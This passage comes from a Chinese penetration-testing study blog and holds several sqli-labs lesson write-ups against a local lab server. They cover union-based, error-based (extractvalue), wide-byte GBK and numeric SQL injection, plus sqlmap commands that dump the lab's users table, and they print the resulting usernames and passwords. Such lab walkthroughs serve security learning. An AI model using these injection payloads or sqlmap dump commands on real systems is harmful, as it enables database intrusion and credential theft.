string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> --current-db爆破数据表sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>最后脱库sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="ngc5z"></a></p><h2 id="或者将抓包内容保存到-txt文件中"><a href="#或者将抓包内容保存到-txt文件中" class="headerlink" title="或者将抓包内容保存到.txt文件中"></a>或者将抓包内容保存到.txt文件中</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span>爆破数据库sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span> --current-db爆破表sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>脱库sqlmap.py <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lees5</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees5/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>?id=1'</code>有报错</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p><strong>用’闭合</strong><br><code>?id=1' order by 4--+</code>提示第4列不存在<br><code>?id=1' order by 3--+</code> 发现没有了用户和ID的回显，只有”You are ing..”,</p><p><code>?id=1' union select 1,2,3--+</code>也只显示”You are ing..”，没有显示回显点。<br><code>?id=1'and 1=2--+</code>没有回显条件为假的错误。</p><p>条件正确有回显，条件错误没有回显；<br>有报错回显， 采取报错注入的方法， <a name="QcX1G"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><strong>报错注入</strong>的运用前提是需要有数据库错误的显示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>是能够使用报错的前提。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错常用的三个函数，<strong>extractvalue()</strong>,<strong>updatexml(),floor()</strong>,还有**exp() **</p><p><a name="tKncj"></a></p><h1 id="用extractvalue函数进行报错注入"><a href="#用extractvalue函数进行报错注入" class="headerlink" title="用extractvalue函数进行报错注入"></a>用extractvalue函数进行报错注入</h1><p>extractvalue(1,1) <a name="FbE6V"></a></p><h2 id="查看数据库名称"><a href="#查看数据库名称" class="headerlink" title="查看数据库名称"></a>查看数据库名称</h2><p><code>?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+</code><br>或<br><code>?id=1' or extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p><blockquote><p>显示XPATH syntax error: ‘<del>security</del>‘<br>XPATH语法错误：“<del>security</del>”</p></blockquote><p><a name="FheLm"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code></p><blockquote><p>显示XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘<br>XPATH语法错误：’<del>emails，referers，uagents，users</del>‘</p></blockquote><p><a name="pidlo"></a></p><h2 id="查看字段名称"><a href="#查看字段名称" class="headerlink" title="查看字段名称"></a>查看字段名称</h2><p><code>?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))--+</code></p><blockquote><p>显示XPATH syntax error: ‘<strong>~user_id,first_name,last_name,us</strong>‘<br>group_concat()函数<strong>可能放不下所有内容</strong>，可以采用<strong>截取</strong>或者<strong>limit函数</strong>读取</p></blockquote><p>可以看出，爆出的字段名称长度超出了32，所以需要使用substring（）函数每隔32位截取一次，最终拼凑出全部内容。<br>?id=1’ or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name=’users’ ),1,31),0x7e))–+</p><blockquote><p>XPATH syntax error: ‘~user_id,first_name,last_name,us’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),32,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~er,password,avatar,last_login,f’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),64,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~iled_login,USER,CURRENT_CONNECT’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),95,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~IONS,TOTAL_CONNECTIONS,id,usern’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name='users' ),126,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘<del>ame,password</del>‘</p></blockquote><p><strong>拼接：</strong><br>user_id,<br>first_name,<br>last_name,<br>user,<br>password,<br>avatar,<br>last_login,<br>filed_login,<br>USER,<br>CURRENT_CONNECT~IONS,<br>TOTAL_CONNECTIONS,<br>id,<br>username,<br>password <a name="g9URs"></a></p><h3 id="或者只查看当前数据库表字段名称："><a href="#或者只查看当前数据库表字段名称：" class="headerlink" title="或者只查看当前数据库表字段名称："></a>或者只查看当前数据库表字段名称：</h3><p><code>?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘<del>id,username,password</del>‘</p></blockquote><p><a name="fpIUQ"></a></p><h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~Dumb^Dumb,Angelina^I-kill-you,D’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),32,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~ummy^p@ssword,secure^crappy,stu’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),63,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~pid^stupidity,superman^genious,’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),94,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~batman^mob!le,admin^admin,admin’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),125,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~1^admin1,admin2^admin2,admin3^a’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),156,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘~dmin3,dhakkan^dumbo,admin4^admi’</p></blockquote><p><code>?id=1' or extractvalue(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),187,31),0x7e))--+</code></p><blockquote><p>XPATH syntax error: ‘<del>n4</del>‘</p></blockquote><p>拼接用户^密码：<br>Dumb^Dumb,<br>Angelina^I-kill-you,<br>Dummy^p@ssword,<br>secure^crappy,<br>stupid^stupidity,<br>superman^genious,<br>batman^mob!le,<br>admin^admin,<br>admin1^admin1,<br>admin2^admin2,<br>admin3^admin3,<br>dhakkan^dumbo,<br>admin4^admin4</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lees1</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/</url>
      
        <content type="html"><![CDATA[<p><a name="z3aMA"></a></p><h1 id="1-判断有无注入点"><a href="#1-判断有无注入点" class="headerlink" title="1.判断有无注入点"></a>1.判断有无注入点</h1><pre><code>$sql="SELECT * FROM users WHERE id='1' LIMIT 0,1";</code></pre><p>单引号闭合</p><p><code>?id=1'</code></p><blockquote><p>select * from users where id=’1’’ limit 0,1</p></blockquote><p>有报错说明有注入点</p><p><a name="lh1Tf"></a></p><h1 id="2-猜解列名数量"><a href="#2-猜解列名数量" class="headerlink" title="2.猜解列名数量"></a>2.猜解列名数量</h1><p><a name="JHoY5"></a></p><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a><code>order by</code></h2><blockquote><p>%20表示为空格</p></blockquote><p><code>?id=1' order by 3 --+</code><br><code>?id=1' order by 4 --+</code></p><blockquote><p>select * from users where id=’1’ order by 3 –+’ limit 0,1</p></blockquote><p>字段 3个 <a name="sFNaN"></a></p><h1 id="3-报错，判断回显点"><a href="#3-报错，判断回显点" class="headerlink" title="3.报错，判断回显点"></a>3.报错，判断回显点</h1><p><a name="XqT1O"></a></p><h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p><code>?id=-1' union select 1,2,3 --+</code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,3 –+’ limit 0,1</p></blockquote><p>2,3是回显点 <a name="qHO7j"></a></p><h1 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h1><blockquote><p>database(): 数据库名称<br>version():数据库版本</p></blockquote><p><code>?id=-1' union select 1,database(),version()--+ </code></p><blockquote><p>select * from users where id=’-1’ union select 1,database(),version()–+’ limit 0,1</p></blockquote><blockquote><p><strong>Your Login name:security</strong><br><strong>Your Password:5.7.26</strong></p></blockquote><p>数据库名称：<strong>securit</strong><br>数据库版本：<strong>5.7.26</strong> <a name="xvLPE"></a></p><h1 id="5-使用对应SQL进行注入"><a href="#5-使用对应SQL进行注入" class="headerlink" title="5.使用对应SQL进行注入"></a>5.使用对应SQL进行注入</h1><blockquote><p>group_concat()函数可以让多个数据在一行显示</p></blockquote><p><a name="EVRXH"></a></p><h2 id="查看所有数据库名称"><a href="#查看所有数据库名称" class="headerlink" title="查看所有数据库名称"></a>查看所有数据库名称</h2><p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+’ limit 0,1</p></blockquote><blockquote><p>Your Login name:2<br>Your Password:<strong>information_schema,challenges,dvwa_com,mysql,performance_schema,security,sql,sys</strong></p></blockquote><blockquote><p><strong>存在的数据库：</strong><br><strong>information_schema</strong><br><strong>challenges</strong><br><strong>dvwa_com</strong><br><strong>performance_schema</strong><br><strong>security</strong><br><strong>sql</strong><br><strong>sys</strong></p></blockquote><p><a name="eGmlZ"></a></p><h2 id="查看使用数据表名称"><a href="#查看使用数据表名称" class="headerlink" title="查看使用数据表名称"></a>查看使用数据表名称</h2><p><code>?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+  </code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+’ limit 0,1</p></blockquote><blockquote><p>Your Login name:2<br>Your Password:<strong>emails,referers,uagents,users</strong></p></blockquote><blockquote><p><strong>表名</strong><br><strong>emails</strong><br><strong>referers</strong><br><strong>uagents</strong><br><strong>users</strong></p></blockquote><p><a name="MZSNh"></a></p><h2 id="查看字段名"><a href="#查看字段名" class="headerlink" title="查看字段名"></a>查看字段名</h2><p><code>?id=-1' union select 1,2,group_concat(column_name) from information_shema.columns where table_name='users'--+</code></p><blockquote><p>select * from users where id=’-1’ union select 1,2,group_concat(column_name) from information_shema.columns where table_name=’users’–+’ limit 0,1</p></blockquote><blockquote><p>Your Login name:2<br>Your Password:<strong>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</strong></p></blockquote><blockquote><p>users的字段名<br><strong>user_id</strong><br><strong>first_name</strong><br><strong>last_name</strong><br><strong>user</strong><br><strong>password</strong><br><strong>avatar</strong><br><strong>last_login</strong><br><strong>failed_login</strong><br><strong>USER</strong><br><strong>CURRENT_CONNECTIONS</strong><br><strong>TOTAL_CONNECTIONS</strong><br><strong>id</strong><br><strong>username</strong><br><strong>password</strong></p></blockquote><p><a name="nJvzj"></a></p><h2 id="查看字段"><a href="#查看字段" class="headerlink" title="查看字段"></a>查看字段</h2><p><code>id=-1' union select 1,2,(select group_concat(username,~,password)from users)--+</code></p><blockquote><p>select * from users where id=’<code>-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code>‘ limit 0,1</p></blockquote><p>0x7e:~</p><blockquote><p>Your Login name:2<br>Your Password:<strong>Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>admin,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4~admin4</strong></p></blockquote><blockquote><p>用户<del>口令:<br>**Dumb</del>Dumb**<br><strong>Angelina~I-kill-you</strong><br><strong>Dummy~p@ssword</strong><br><strong>secure~crappy</strong><br><strong>stupid~stupidity</strong><br><strong>superman~genious</strong><br><strong>batman~mob!le</strong><br><strong>admin~admin</strong><br><strong>admin1~admin1</strong><br><strong>admin2~admin2</strong><br><strong>admin3~admin3</strong><br><strong>dhakkan~dumbo</strong><br><strong>admin4~admin4</strong></p></blockquote><br><a name="KKJFS"></a># sqlmap`sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch`&gt; **--batch:跳过询问,代表全自动 不用我们手动输入y/n**&gt; **-u:ip地址**<pre><code>┌──(root㉿guoyx)-[/home/kali]└─# sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch[22:05:28] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.29, Apache 2.4.39back-end DBMS: MySQL &gt;= 5.6</code></pre><p>PHP 5.3.29,<br>&amp;#x20;Apache 2.4.39<br>back-end DBMS: MySQL &gt;= 5.6 <a name="ZKiKa"></a></p><h2 id="查看当前数据库名称"><a href="#查看当前数据库名称" class="headerlink" title="查看当前数据库名称"></a>查看当前数据库名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch --current-db</code></p><blockquote><p>--current-db:查看数据库名称</p></blockquote><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# sqlmap -u http://192.168.31.193/Less-1/?id=1 --batch --current-db[22:11:23] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.4.39, PHP 5.3.29back-end DBMS: MySQL &gt;= 5.6[22:11:23] [INFO] fetching current databasecurrent database: 'security'[22:11:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.31.193'</code></pre><p>security <a name="tOsVp"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" --tables</code></p><blockquote><p>-D  ：指定数据库名称<br>--tables：查看数据表</p></blockquote><pre class="line-numbers language-none"><code class="language-none">sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" --tablesDatabase: security[4 tables]+----------+| emails   || referers || uagents  || users    |+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emails<br>referers<br>uagents<br>users <a name="rLD4A"></a></p><h2 id="查看字段名-1"><a href="#查看字段名-1" class="headerlink" title="查看字段名"></a>查看字段名</h2><p><code>sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" --columns</code></p><blockquote><p>-T “users” ：指定表名称<br>--columns：查看字段名</p></blockquote><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[/home/kali]└─# sqlmap -u 192.168.31.193/Less-1/?id=1 -D security -T users --columns[3 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| id       | int(3)      || password | varchar(20) || username | varchar(20) |+----------+-------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>id<br>password<br>username <a name="dvpUW"></a></p><h2 id="查看字段-1"><a href="#查看字段-1" class="headerlink" title="查看字段"></a>查看字段</h2><p><code>sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" -C id,password,username --dump</code></p><blockquote><p>-C id,password,username：指定要显示的列<br>--dump脱裤</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>└─<span class="token comment"># sqlmap -u 192.168.31.193/Less-1/?id=1 --batch -D "security" -T "users" -C id,password,username --dump</span><span class="token punctuation">[</span><span class="token number">13</span> entries<span class="token punctuation">]</span>+----+------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password   <span class="token operator">|</span> username <span class="token operator">|</span>+----+------------+----------+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Dumb       <span class="token operator">|</span> Dumb     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> I-kill-you <span class="token operator">|</span> Angelina <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> p@ssword   <span class="token operator">|</span> Dummy    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> crappy     <span class="token operator">|</span> secure   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">5</span>  <span class="token operator">|</span> stupidity  <span class="token operator">|</span> stupid   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">6</span>  <span class="token operator">|</span> genious    <span class="token operator">|</span> superman <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">7</span>  <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span> batman   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">8</span>  <span class="token operator">|</span> admin      <span class="token operator">|</span> admin    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">9</span>  <span class="token operator">|</span> admin1     <span class="token operator">|</span> admin1   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> admin2     <span class="token operator">|</span> admin2   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> admin3     <span class="token operator">|</span> admin3   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dumbo      <span class="token operator">|</span> dhakkan  <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">14</span> <span class="token operator">|</span> admin4     <span class="token operator">|</span> admin4   <span class="token operator">|</span>+----+------------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less37</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/less37/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/less37/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span> <span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>mysql_real_escape_string</p></blockquote><p>post型的宽字节注入 <a name="gLILH"></a></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p><a name="izUqu"></a></p><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>uname=**汉'** order by 3--+  </code><br>2个字段 <a name="B0iQ5"></a></p><h2 id="回显点检查"><a href="#回显点检查" class="headerlink" title="回显点检查"></a>回显点检查</h2><p><code>uname=汉' union select 1,2--+</code> <a name="kzUVz"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要看用户,数据库版本&amp;#x20;<br><code>uname=汉' union select user(),version()--+</code>\ <a name="kzVJM"></a></p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称<span class="token assign-left variable">uname</span><span class="token operator">=</span>汉<span class="token string">' union select 1,database()--+爆破数据库表名称uname=汉'</span> union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称users的16进制是0x7573657273<span class="token assign-left variable">uname</span><span class="token operator">=</span>汉<span class="token string">' union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+爆破字段内容uname=汉'</span> union <span class="token keyword">select</span> <span class="token number">1</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less35</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less35/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less35/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span> <span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin class-name">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>get,数字型注入</strong>。</p><p><code>?id=1 and 1=1--+</code>返回正常<br><code>?id=1 and 1=2--+</code>没有报错回显</p><p><code>?id=1 order by 4--+</code>没有第4列<br><code>?id=1 order by 3--+</code>返回正常<br>3个字段</p><p>数字型注入唯一需要注意的是<br>在查询字段时，<strong>数据表名使用十六进制</strong>即可，其他地方没有转义 。 <a name="RN6n1"></a></p><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称 ?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称爆破字段的时候需要将数据表的名字进行十六进制编码，防止转义  users的16进制是0x7573657273?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span>0x7573657273--+爆破字段内容?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less34</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less34/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/less34/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span> <span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>post型宽字节注入 ，单引号’闭合</p><p><code>admin' or 1=1-++</code></p><blockquote><p>Hint: The Username you input is escaped as : admin’ or 1=1-++<br>Hint: The Password you input is escaped as :</p></blockquote><p>在登录框尝试字符登录发现有转义&amp;#x20;<br>&amp;#x20;因为是post提交不能使用url编码，<br>但是可以<strong>使用十六进制编码绕过</strong>，但是需要使用三个字节，<br>最好的 办法是是<strong>使用汉字</strong>(一些汉字是三个字节的就可以将后面的\消耗) <a name="rJWqQ"></a></p><h1 id="post型宽字节注入"><a href="#post型宽字节注入" class="headerlink" 